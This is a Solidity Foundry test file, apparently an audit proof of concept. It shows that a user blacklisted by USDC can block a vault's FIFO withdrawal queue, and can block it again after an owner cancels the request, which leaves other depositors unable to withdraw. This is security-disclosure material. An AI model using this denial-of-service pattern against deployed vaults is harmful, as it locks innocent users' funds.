// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {LazyUSDVault} from "../src/LazyUSDVault.sol";
import {RoleManager} from "../src/RoleManager.sol";

// Standalone MockUSDC with blacklist functionality
contract MockUSDCWithBlacklist {
    string public constant name = "USD Coin";
    string public constant symbol = "USDC";
    uint8 public constant decimals = 6;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public isBlacklisted;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function blacklist(address account) external {
        isBlacklisted[account] = true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(!isBlacklisted[msg.sender], "Blacklisted");
        require(!isBlacklisted[to], "Blacklisted");
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(!isBlacklisted[from], "Blacklisted");
        require(!isBlacklisted[to], "Blacklisted");
        require(!isBlacklisted[msg.sender], "Blacklisted");
        require(balanceOf[from] >= amount, "Insufficient balance");
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");

        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }

        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
    
    // Helper to simulate code size check
    function code() external view returns (bytes memory) {
        return "";
    }
}

contract AuditPoCT is Test {
    LazyUSDVault public vault;
    RoleManager public roleManager;
    MockUSDCWithBlacklist public usdc;

    address public owner = address(this);
    address public multisig = makeAddr("multisig");
    address public treasury = makeAddr("treasury");
    address public operator = makeAddr("operator");
    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");

    function setUp() public {
        usdc = new MockUSDCWithBlacklist();
        roleManager = new RoleManager(owner);
        
        vault = new LazyUSDVault(
            address(usdc),
            address(roleManager),
            multisig,
            treasury,
            0.1e18, // 10% fee
            1 days, // Cooldown
            "Share",
            "SHARE"
        );

        roleManager.setOperator(operator, true);

        // Setup users
        usdc.mint(alice, 100_000e6);
        usdc.mint(bob, 100_000e6);

        vm.startPrank(alice);
        usdc.approve(address(vault), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(bob);
        usdc.approve(address(vault), type(uint256).max);
        vm.stopPrank();
    }

    function test_blacklist_dos() public {
        // 1. Alice deposits
        vm.prank(alice);
        vault.deposit(10_000e6);

        // 2. Bob deposits
        vm.prank(bob);
        vault.deposit(10_000e6);

        // 3. Alice requests withdrawal
        vm.prank(alice);
        vault.requestWithdrawal(10_000e6); // 10k shares (1:1 price)

        // 4. Bob requests withdrawal (to show he is stuck)
        vm.warp(block.timestamp + 10);
        vm.prank(bob);
        vault.requestWithdrawal(10_000e6);

        // 5. Alice gets blacklisted by USDC
        usdc.blacklist(alice);

        // 6. Wait for cooldown
        vm.warp(block.timestamp + 2 days);

        // 7. Operator tries to fulfill withdrawals
        vm.prank(operator);
        // This fails because Alice is at the head of the queue, and transfer to Alice reverts.
        vm.expectRevert("Blacklisted"); 
        vault.fulfillWithdrawals(10);

        // 8. Queue is bricked. Bob cannot exit.
        assertEq(vault.withdrawalQueueHead(), 0);

        // 9. Attempt Emergency Force Process - also fails
        vm.expectRevert("Blacklisted");
        vault.forceProcessWithdrawal(0);
        
        // 10. Owner cancels Alice's withdrawal to unblock
        vault.cancelWithdrawal(0);
        
        // Queue is unblocked for Bob...
        vm.prank(operator);
        vault.fulfillWithdrawals(10);
        assertEq(vault.withdrawalQueueHead(), 2); 
        
        // BUT Alice still has shares!
        assertEq(vault.balanceOf(alice), 10_000e18); // Shares returned
        
        // Alice can just request again to re-brick the queue.
        vm.prank(alice);
        vault.requestWithdrawal(10_000e6);
        
        // Bricked again!
        vm.warp(block.timestamp + 2 days);
        vm.prank(operator);
        vm.expectRevert("Blacklisted");
        vault.fulfillWithdrawals(10);
        
        console2.log("Queue successfully bricked by blacklisted user looping requests.");
    }
}
